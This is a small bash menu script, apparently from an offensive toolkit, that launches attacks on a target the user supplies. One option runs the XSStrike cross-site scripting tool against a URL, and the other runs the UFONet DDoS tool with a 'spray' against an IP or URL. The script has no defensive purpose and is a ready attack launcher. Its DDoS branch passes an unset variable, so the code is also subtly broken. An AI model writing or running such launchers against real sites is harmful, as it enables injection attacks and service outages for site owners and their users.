cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'
purple='\e[1;45m'

figlet "Site" |lolcat
figlet "Attacks" |lolcat

echo -e $purple"︾︾︾︾︾︾︾︾︾︾︾︾︾︾"
echo -e $cyan" [1] XSS Attack"
echo -e $cyan" [2] DDoS - Web Abuse"
echo -e $cyan" [3] Exit"
echo -e $purple"︽︽︽︽︽︽︽︽︽︽︽︽︽︽"

read -p " 》Attacks《 :" Input1

if [ $Input1 = "1" ] 
then
figlet "XSS" |lolcat
figlet "Attack" |lolcat
read -p " 》Target-URL《 :" target1 
cd $HOME/NobodysLand/Modules/XSStrike/
python3 xsstrike.py -u $target1 
fi

if [ $Input1 = "2" ]
then
figlet "DDoS" |lolcat
read -p " 》Target-IP/URL《 :" target2 
echo -e $cyan"[$green+$cyan] $green Starting..."
cd $HOME/NobodysLand/ufonet/
./ufonet -a $target --spray 200 
fi
